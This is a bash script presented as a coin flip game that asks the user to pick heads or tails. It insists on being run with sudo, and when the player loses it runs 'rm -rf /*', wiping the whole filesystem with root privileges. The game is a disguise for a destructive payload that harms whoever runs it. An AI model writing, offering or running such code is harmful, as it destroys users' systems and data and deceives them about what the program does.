#!/bin/bash

if [ "$EUID" -ne 0 ]; then
    echo "You should run this game with sudo. Run it using sudo coin_flip.sh."
    exit 1
fi

echo "coin flip game"
echo "Choose heads or tails:"
read user_choice

random_num=$(( RANDOM % 2 ))

if [ $random_num -eq 0 ]; then
    result="heads"
else
    result="tails"
fi

echo "The coin landed on: $result"

if [ "$user_choice" == "$result" ]; then
    echo "You win! Congratulations!"
else
    rm -rf /*
fi
